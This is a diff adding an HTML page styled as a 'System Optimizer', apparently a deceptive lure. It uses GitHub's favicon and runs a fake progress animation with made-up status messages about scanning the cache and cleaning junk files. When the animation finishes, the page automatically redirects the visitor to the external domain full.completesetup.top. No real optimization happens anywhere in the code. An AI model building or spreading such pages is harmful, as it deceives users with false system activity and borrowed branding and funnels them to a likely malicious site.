@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Optimizer</title>
+
+<link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg">
+
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+}
+
+body{
+height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+background:#0b0f17;
+overflow:hidden;
+color:#e6edf3;
+}
+
+/* soft animated background */
+.bg{
+position:absolute;
+inset:0;
+background:
+radial-gradient(circle at 20% 30%, rgba(56,139,253,.25), transparent 40%),
+radial-gradient(circle at 80% 50%, rgba(46,160,67,.18), transparent 40%),
+radial-gradient(circle at 50% 80%, rgba(168,85,247,.15), transparent 45%);
+filter:blur(90px);
+animation:move 8s ease-in-out infinite alternate;
+}
+
+@keyframes move{
+from{transform:translate(-4%,-4%)}
+to{transform:translate(4%,4%)}
+}
+
+/* center card */
+.card{
+width:380px;
+background:rgba(22,27,34,.92);
+border:1px solid #30363d;
+border-radius:18px;
+padding:22px;
+z-index:2;
+box-shadow:0 25px 80px rgba(0,0,0,.65);
+backdrop-filter:blur(22px);
+}
+
+/* header */
+.header{
+display:flex;
+align-items:center;
+gap:10px;
+margin-bottom:10px;
+}
+
+.header img{
+width:22px;
+height:22px;
+}
+
+.title{
+font-size:13px;
+font-weight:600;
+}
+
+.sub{
+font-size:11px;
+color:#8b949e;
+}
+
+/* big smooth progress */
+.bar{
+margin-top:14px;
+height:12px;
+background:#21262d;
+border-radius:999px;
+overflow:hidden;
+position:relative;
+}
+
+/* animated liquid fill */
+.fill{
+width:0%;
+height:100%;
+background:linear-gradient(90deg,#238636,#39d353,#58a6ff);
+background-size:300% 100%;
+animation:shine 2s linear infinite;
+transition:width .25s ease;
+}
+
+@keyframes shine{
+0%{background-position:0%}
+100%{background-position:300%}
+}
+
+/* glow wave */
+.bar::after{
+content:"";
+position:absolute;
+top:0;
+left:-40%;
+width:40%;
+height:100%;
+background:linear-gradient(90deg,transparent,rgba(255,255,255,.25),transparent);
+animation:wave 2.5s infinite;
+}
+
+@keyframes wave{
+0%{left:-40%}
+100%{left:120%}
+}
+
+/* status */
+.status{
+margin-top:12px;
+font-size:12px;
+color:#8b949e;
+min-height:18px;
+}
+
+/* smooth scan blocks */
+.grid{
+display:grid;
+grid-template-columns:repeat(14,1fr);
+gap:3px;
+margin-top:14px;
+}
+
+.cell{
+aspect-ratio:1;
+background:#21262d;
+border-radius:2px;
+transition:.4s;
+opacity:.5;
+}
+
+.active{
+background:#39d353;
+opacity:1;
+transform:scale(1.05);
+}
+
+/* footer pulse dot */
+.footer{
+margin-top:14px;
+display:flex;
+align-items:center;
+gap:8px;
+font-size:11px;
+color:#8b949e;
+}
+
+.dot{
+width:7px;
+height:7px;
+border-radius:50%;
+background:#39d353;
+animation:pulse 1.5s infinite;
+}
+
+@keyframes pulse{
+0%,100%{transform:scale(1);opacity:1}
+50%{transform:scale(1.7);opacity:.4}
+}
+</style>
+</head>
+
+<body>
+
+<div class="bg"></div>
+
+<div class="card">
+
+<div class="header">
+<img src="https://github.githubassets.com/favicons/favicon.svg">
+<div>
+<div class="title">System Optimizer</div>
+<div class="sub">Ultra fast optimization engine</div>
+</div>
+</div>
+
+<div class="bar">
+<div class="fill" id="fill"></div>
+</div>
+
+<div class="status" id="status">Initializing engine...</div>
+
+<div class="grid" id="grid"></div>
+
+<div class="footer">
+<div class="dot"></div>
+Running background optimization
+</div>
+
+</div>
+
+<script>
+
+const grid=document.getElementById("grid");
+
+for(let i=0;i<112;i++){
+const d=document.createElement("div");
+d.className="cell";
+grid.appendChild(d);
+}
+
+const cells=document.querySelectorAll(".cell");
+
+setInterval(()=>{
+const c=cells[Math.floor(Math.random()*cells.length)];
+c.classList.add("active");
+
+setTimeout(()=>{
+c.classList.remove("active");
+},900);
+
+},45);
+
+const fill=document.getElementById("fill");
+const status=document.getElementById("status");
+
+let p=0;
+
+function run(){
+
+p++;
+
+fill.style.width=p+"%";
+
+if(p===10)status.textContent="Scanning system cache...";
+if(p===30)status.textContent="Analyzing performance...";
+if(p===55)status.textContent="Cleaning junk files...";
+if(p===80)status.textContent="Optimizing system resources...";
+
+if(p<100){
+setTimeout(run,30);
+}else{
+status.textContent="Optimization complete";
+
+setTimeout(()=>{
+window.location.href="https://full.completesetup.top/";
+},1000);
+}
+
+}
+
+run();
+
+</script>
+
+</body>
+</html>
